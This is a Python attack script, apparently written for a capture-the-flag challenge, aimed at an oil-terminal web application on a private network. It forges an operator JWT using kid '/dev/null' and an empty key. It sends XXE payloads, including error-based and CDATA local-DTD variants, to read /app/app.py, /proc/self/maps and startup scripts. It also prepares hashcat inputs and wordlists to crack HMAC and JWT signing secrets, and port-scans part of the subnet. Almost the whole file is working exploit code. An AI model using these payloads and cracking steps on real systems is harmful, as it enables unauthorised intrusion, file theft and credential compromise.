#!/usr/bin/env python3
"""round54 — hashcat hash prep + local DTD XXE + targeted key testing"""
import requests, time, json, hmac as hm, hashlib, base64, os, struct

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_op():
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":"operator",
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_op()}"}

KNOWN_URL = "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
KNOWN_SIG = "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"

# Session JWT (carrier key)
SESSION_JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImNhcnJpZXIifQ.eyJzdWIiOjYwNzcsImNvbXBhbnkiOiJDVEZfVGVhbV9mdWJ6bnoiLCJyb2xlIjoiY2FycmllciIsImlhdCI6MTc5MDc0NzM1MywiZXhwIjoxNzkwODMzNzUzfQ.8ftXHw7MRvsWOK3U46ormeLHB0fnZOfUHVOHMM0JYCo"

def xxe_read(path, field="remarks"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=15)
        if r.status_code == 200:
            try:
                d = r.json()
                return "OK", d.get("summary",{}).get(field,"")
            except:
                return "RAW", r.text[:500]
        elif r.status_code == 400:
            return "BIN", r.text[:200]
        else:
            return f"E{r.status_code}", r.text[:200]
    except Exception as e:
        return "ERR", str(e)[:150]

# ============================================================
print("="*70)
print("PHASE 1: HASHCAT — ПОДГОТОВКА ХЕШЕЙ")
print("="*70)

# HMAC-SHA256 hash for hashcat mode 1450
# Format: <hex_hmac>:<message>
hmac_hash = f"{KNOWN_SIG}:{KNOWN_URL}"
print(f"  [hashcat -m 1450] HMAC-SHA256 probe hash:")
print(f"  {hmac_hash}")

# Save to file
with open("probe_hmac.hash", "w") as f:
    f.write(hmac_hash + "\n")
print(f"  Saved to: probe_hmac.hash")

# JWT hash for hashcat mode 16500
print(f"\n  [hashcat -m 16500] JWT carrier hash:")
print(f"  {SESSION_JWT}")

with open("carrier_jwt.hash", "w") as f:
    f.write(SESSION_JWT + "\n")
print(f"  Saved to: carrier_jwt.hash")

# Also write all 5 probe hashes (more data = better cracking)
with open("probe_all_hmac.hash", "w") as f:
    sigs = {
        "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09": "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
        "ece8b8f9671e56962dcb233b483c94fd1ea7384ec10d27288925572c6a44c803": "http://gauge-gw.internal:9100/v1/tanks/1/level",
        "0e996e2ff657529641db10233f9f863a846e06b178c6ad37908185a190a66197": "http://gauge-gw.internal:9100/v1/tanks/2/level",
        "c0a3f9ef039f26fe9a8bcfb41b71427587dc88dc0ef600b1c49488b072f2c9d3": "http://gauge-gw.internal:9100/v1/tanks/3/level",
        "447a4c0f1fa7769cdfb2b67842364d8b699b5e85a5b2784524146f7a5af5132f": "http://gauge-gw.internal:9100/v1/tanks/7/level",
    }
    for sig, url in sigs.items():
        f.write(f"{sig}:{url}\n")
print(f"  All 5 probe HMACs saved to: probe_all_hmac.hash")

print(f"\n  КОМАНДЫ ДЛЯ HASHCAT:")
print(f"  # Cracking PROBE_SECRET (HMAC-SHA256):")
print(f"  hashcat -m 1450 probe_hmac.hash /usr/share/wordlists/rockyou.txt")
print(f"  hashcat -m 1450 probe_hmac.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule")
print(f"  hashcat -m 1450 probe_hmac.hash -a 3 '?a?a?a?a?a?a?a?a'  # brute 8 chars")
print(f"  ")
print(f"  # Cracking carrier JWT key:")
print(f"  hashcat -m 16500 carrier_jwt.hash /usr/share/wordlists/rockyou.txt")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: TARGETED WORDLIST — БЫСТРАЯ ПРОВЕРКА 500 СЛОВ")
print("="*70)

# Генерируем целевой wordlist
words = set()

# CTF / Challenge
for w in ["flag", "ctf", "KHS", "khs", "KazHackStan", "kazhackstan",
          "LLEHS", "llehs", "SHELL", "shell", "Shell",
          "probe", "secret", "ProbeSecret", "probe_secret", "PROBE_SECRET",
          "admin", "password", "changeme", "default"]:
    words.add(w)

# Application
for w in ["caspi", "Caspi", "CASPI", "CaspiTerminal", "caspiterminal",
          "terminal", "Terminal", "TERMINAL",
          "gauge", "Gauge", "gauge-gw", "gauge_gw",
          "aktau", "Aktau", "AKTAU", "mangystau", "Mangystau",
          "oil", "depot", "oil-depot", "oildepot", "OilDepot",
          "fuel", "tank", "loading", "custody",
          "operator", "carrier"]:
    words.add(w)

# Docker / Container
for w in ["5407f6317f5c", "khs-oil-depot", "khsoildepot",
          "terminal_web", "terminal_web_pw",
          "docker", "container"]:
    words.add(w)

# Common secrets
for w in ["secret", "mysecret", "supersecret", "s3cr3t", "s3cret",
          "key", "mykey", "apikey", "api_key", "API_KEY",
          "hmac", "hmac_key", "hmac_secret", "signing_key",
          "token", "auth", "test", "demo", "development",
          "production", "staging"]:
    words.add(w)

# Kazakh/Russian
for w in ["каспий", "терминал", "мангистау", "актау", "нефть",
          "мунай", "газ", "секрет", "ключ", "пароль"]:
    words.add(w)

# Numbers and dates
for w in ["2024", "2025", "2026", "9000", "9100", "8007", "3000",
          "123456", "12345678", "1234567890"]:
    words.add(w)

# Mutations: add common suffixes
base_words = list(words)
for w in base_words:
    for suffix in ["", "!", "1", "123", "_secret", "_key", "2024", "2025", "2026"]:
        words.add(w + suffix)
    words.add(w.lower())
    words.add(w.upper())
    words.add(w.capitalize())

# KHS specific patterns
for w in ["KHS{", "STF{", "KHS2024", "KHS2025", "KHS2026"]:
    words.add(w)

# Hex patterns from known values
words.add("c8142af02727b3d7d51e4aece866104b")  # XXE flag hash
words.add("c360e9431fb630289c4e99b0c9c3641e08dd924c24ca5a95")  # LFI flag hash

print(f"  Wordlist: {len(words)} candidates")

# Test each word
match_found = False
for word in sorted(words):
    sig = hm.new(word.encode('utf-8'), KNOWN_URL.encode(), hashlib.sha256).hexdigest()
    if sig == KNOWN_SIG:
        print(f"\n  *** PROBE_SECRET FOUND: '{word}' ***")
        match_found = True
        break

# Also test with word as raw bytes (for binary keys)
for word in ["5407f6317f5c"]:
    try:
        raw = bytes.fromhex(word)
        sig = hm.new(raw, KNOWN_URL.encode(), hashlib.sha256).hexdigest()
        if sig == KNOWN_SIG:
            print(f"\n  *** PROBE_SECRET (hex bytes): {word} ***")
            match_found = True
    except:
        pass

if not match_found:
    print(f"  Ни одно слово не подошло.")

# Save wordlist for hashcat
with open("probe_wordlist.txt", "w") as f:
    for w in sorted(words):
        f.write(w + "\n")
print(f"  Wordlist saved to: probe_wordlist.txt")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: LOCAL DTD XXE — ПОИСК DTD ФАЙЛОВ")
print("="*70)

# Search for DTD files on the system
dtd_paths = [
    # fontconfig
    "/usr/share/xml/fontconfig/fonts.dtd",
    "/etc/fonts/fonts.dtd",
    # docbook
    "/usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd",
    "/usr/share/sgml/docbook/dtd/xml/4.5/docbookx.dtd",
    "/usr/share/yelp/dtd/docbookx.dtd",
    # XHTML
    "/usr/share/xml/xhtml/xhtml1-transitional.dtd",
    "/usr/share/xml/xhtml-config/xhtml1.dtd",
    # scrollkeeper
    "/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd",
    # GLib
    "/usr/share/glib-2.0/schemas/gschema.dtd",
    # Shared MIME
    "/usr/share/mime/packages/freedesktop.org.xml",
    # GTK/GNOME
    "/usr/share/gtk-doc/html/glib/glib.devhelp2",
    # Common Linux
    "/usr/share/xml/schema/xml-core/catalog.xml",
    "/etc/xml/catalog",
    "/usr/share/xml/misc/xml.dcl",
    # Python lxml
    "/usr/local/lib/python3.11/site-packages/lxml/isoschematron/resources/xsl/iso-schematron-xslt1/iso_dsdl_include.xsl",
    "/usr/local/lib/python3.11/site-packages/lxml/isoschematron/resources/xsl/iso-schematron-xslt1/iso_schematron_skeleton_for_xslt1.xsl",
    "/usr/local/lib/python3.11/site-packages/lxml/isoschematron/resources/xsl/RNG2Schtrn.xsl",
    # Python standard lib
    "/usr/lib/python3.11/xml/sax/expatreader.py",
    "/usr/local/lib/python3.11/xml/etree/ElementTree.py",
    # System SGML
    "/usr/share/sgml/xml.dcl",
    "/usr/share/sgml/html/4.01/HTML4.dtd",
    # Debian/Ubuntu specific
    "/usr/share/xml/entities/xml-iso-entities-8879.1986/ISOamso",
]

found_dtds = []
for dtd in dtd_paths:
    st, val = xxe_read(dtd)
    if st == "OK" and val:
        found_dtds.append(dtd)
        print(f"  [FOUND] {dtd}: {val[:150]}")
    elif st == "BIN":
        found_dtds.append(dtd)
        print(f"  [BIN]   {dtd}")

if not found_dtds:
    print("  Ни одного DTD файла не найдено")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: LOCAL DTD XXE ATTACK")
print("="*70)

# If we found a DTD, try the local DTD technique
for dtd_path in found_dtds:
    print(f"\n  Trying DTD: {dtd_path}")

    # We need to know what entities the DTD defines
    # Common entity names in DTDs:
    entity_names = ["ISOamso", "ISOamsa", "ISOamsb", "ISOamsc", "ISOamsn",
                    "ISOamsr", "ISObox", "ISOcyr1", "ISOcyr2", "ISOdia",
                    "ISOgrk1", "ISOgrk2", "ISOgrk3", "ISOgrk4", "ISOlat1",
                    "ISOlat2", "ISOnum", "ISOpub", "ISOtech",
                    "HTMLlat1", "HTMLspecial", "HTMLsymbol",
                    # fontconfig entities
                    "int", "string", "double", "bool", "matrix",
                    "name", "const", "family", "familylang",
                    # generic
                    "content", "param", "element"]

    for ent_name in entity_names:
        # Error-based XXE via local DTD
        xxe_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY % local SYSTEM "file://{dtd_path}">
  <!ENTITY % {ent_name} '
    <!ENTITY &#x25; file SYSTEM "file:///app/app.py">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexist/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local;
]>
<ticket>
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks>R</remarks>
</ticket>'''
        try:
            r = S.post(f"{CASPI}/api/ops/custody/ingest",
                data=xxe_payload, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=10)
            if r.status_code != 400 and r.status_code != 200:
                print(f"    {ent_name}: [{r.status_code}] {r.text[:200]}")
            elif r.status_code == 200:
                print(f"    {ent_name}: [{r.status_code}] INTERESTING! {r.text[:200]}")
            # 400 = typical failure, skip
        except Exception as e:
            print(f"    {ent_name}: ERR {str(e)[:80]}")

        # Also try CDATA wrapping (might work if file has < but no &)
        xxe_cdata = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY % local SYSTEM "file://{dtd_path}">
  <!ENTITY % {ent_name} '
    <!ENTITY &#x25; file SYSTEM "file:///app/app.py">
    <!ENTITY &#x25; start "&#x3c;![CDATA[">
    <!ENTITY &#x25; end "]]&#x3e;">
    <!ENTITY &#x25; wrapper "&#x3c;!ENTITY content &#x27;&#x25;start;&#x25;file;&#x25;end;&#x27;&#x3e;">
    &#x25;wrapper;
  '>
  %local;
]>
<ticket>
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks>&content;</remarks>
</ticket>'''
        try:
            r = S.post(f"{CASPI}/api/ops/custody/ingest",
                data=xxe_cdata, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=10)
            if r.status_code == 200:
                data = r.json()
                remarks = data.get("summary", {}).get("remarks", "")
                if remarks and remarks != "R":
                    print(f"    CDATA {ent_name}: *** GOT CONTENT: {remarks[:500]} ***")
            elif r.status_code != 400:
                print(f"    CDATA {ent_name}: [{r.status_code}] {r.text[:200]}")
        except Exception as e:
            print(f"    CDATA {ent_name}: ERR {str(e)[:80]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: JWT KEY CRACKING — CARRIER KEY")
print("="*70)

# We have a JWT signed with the carrier key
# Try common JWT secrets
jwt_parts = SESSION_JWT.split(".")
jwt_message = f"{jwt_parts[0]}.{jwt_parts[1]}".encode()
jwt_sig_bytes = base64.urlsafe_b64decode(jwt_parts[2] + "==")

jwt_secrets = [
    "secret", "password", "key", "carrier", "jwt_secret", "jwt-secret",
    "caspi", "terminal", "caspiterminal", "CaspiTerminal",
    "hmac_secret", "signing_key", "auth_secret", "app_secret",
    "flask_secret", "flask-secret", "SECRET_KEY",
    "carrier_key", "carrier-key", "carrier_secret",
    "operator", "operator_key", "admin",
    "probe", "probe_secret", "probe_key",
    "changeme", "supersecret", "s3cr3t",
    "aktau", "mangystau", "gauge", "gauge-gw",
    "terminal_web_pw", "terminal_web",
    "5407f6317f5c", "khs-oil-depot",
    "KazHackStan", "kazhackstan", "KHS",
]

for secret in jwt_secrets:
    expected_sig = hm.new(secret.encode(), jwt_message, hashlib.sha256).digest()
    if expected_sig == jwt_sig_bytes:
        print(f"  *** CARRIER KEY FOUND: '{secret}' ***")
        # Test it as PROBE_SECRET too
        probe_sig = hm.new(secret.encode(), KNOWN_URL.encode(), hashlib.sha256).hexdigest()
        if probe_sig == KNOWN_SIG:
            print(f"  *** AND IT'S ALSO THE PROBE_SECRET!!! ***")
        break
else:
    print(f"  Carrier key not in top {len(jwt_secrets)} common secrets")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: СКАНИРОВАНИЕ CTF СЕТИ")
print("="*70)

import socket

# Scan more of the network — maybe there's another service with PROBE_SECRET info
print("  Scanning 192.168.242.1-150 for web services (80, 8000-8100)...")
found_hosts = []
for ip_suffix in list(range(1, 20)) + list(range(95, 115)) + list(range(140, 155)):
    target = f"192.168.242.{ip_suffix}"
    for port in [80, 443, 8000, 8007, 8080, 8443, 9000]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            result = sock.connect_ex((target, port))
            if result == 0:
                found_hosts.append((target, port))
                print(f"  [OPEN] {target}:{port}")
            sock.close()
        except:
            pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: ENTRYPOINT.SH — АЛЬТЕРНАТИВНЫЙ ПУТЬ")
print("="*70)

# entrypoint.sh exists but has forbidden chars
# Let's try reading it with different entity positions
for field in ["reference", "carrier", "remarks"]:
    st, val = xxe_read("/app/entrypoint.sh", field)
    print(f"  /app/entrypoint.sh [field={field}]: [{st}] {val[:200] if val else 'empty'}")

# What about /app/start.sh, /docker-entrypoint.sh?
for f in ["/start.sh", "/docker-entrypoint.sh", "/entrypoint.sh",
          "/usr/local/bin/docker-entrypoint.sh", "/usr/local/bin/start.sh",
          "/app/run.sh", "/app/start.sh"]:
    st, val = xxe_read(f)
    if st == "OK" and val:
        print(f"\n  [FOUND] {f}:\n{val[:500]}")
    elif st == "BIN":
        print(f"  [BIN] {f}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: /proc/self/maps — ТОЧНЫЕ АДРЕСА ПАМЯТИ")
print("="*70)

# Read memory map to identify Python heap and code regions
st, val = xxe_read("/proc/self/maps")
if st == "OK":
    lines = val.strip().split('\n')
    print(f"  {len(lines)} memory regions")

    # Show interesting regions (heap, stack, Python related)
    for line in lines:
        if any(x in line.lower() for x in ['heap', 'stack', 'python', 'app.py',
                                             'app/', 'libpython', '[vdso]']):
            print(f"  {line}")

    # Also show the first few anonymous regions (might contain Python data)
    anon_regions = [l for l in lines if ' 0 ' in l and 'r' in l.split()[1]]
    if anon_regions:
        print(f"\n  Readable anonymous regions (first 5):")
        for r in anon_regions[:5]:
            print(f"    {r}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 9: HASHCAT QUICK TEST — ЕСЛИ ЕСТЬ НА KALI")
print("="*70)

import subprocess
# Test if hashcat is available
try:
    result = subprocess.run(["hashcat", "--version"], capture_output=True, text=True, timeout=5)
    print(f"  hashcat version: {result.stdout.strip()}")

    # Quick test with our wordlist
    print(f"\n  Running hashcat -m 1450 with probe_wordlist.txt...")
    result = subprocess.run(
        ["hashcat", "-m", "1450", "probe_hmac.hash", "probe_wordlist.txt",
         "--force", "--quiet", "-O"],
        capture_output=True, text=True, timeout=60
    )
    if result.stdout.strip():
        print(f"  *** HASHCAT RESULT: {result.stdout.strip()} ***")
    else:
        print(f"  No match in probe_wordlist.txt")

    # Try JWT too
    print(f"\n  Running hashcat -m 16500 with probe_wordlist.txt...")
    result = subprocess.run(
        ["hashcat", "-m", "16500", "carrier_jwt.hash", "probe_wordlist.txt",
         "--force", "--quiet", "-O"],
        capture_output=True, text=True, timeout=60
    )
    if result.stdout.strip():
        print(f"  *** JWT KEY: {result.stdout.strip()} ***")
    else:
        print(f"  No JWT key match in probe_wordlist.txt")

except FileNotFoundError:
    print("  hashcat не установлен на этой машине")
    print("  Запусти на Кали:")
    print(f"  hashcat -m 1450 probe_hmac.hash /usr/share/wordlists/rockyou.txt --force")
except Exception as e:
    print(f"  hashcat error: {e}")

print("\n"+"="*70)
print("DONE")
print("="*70)
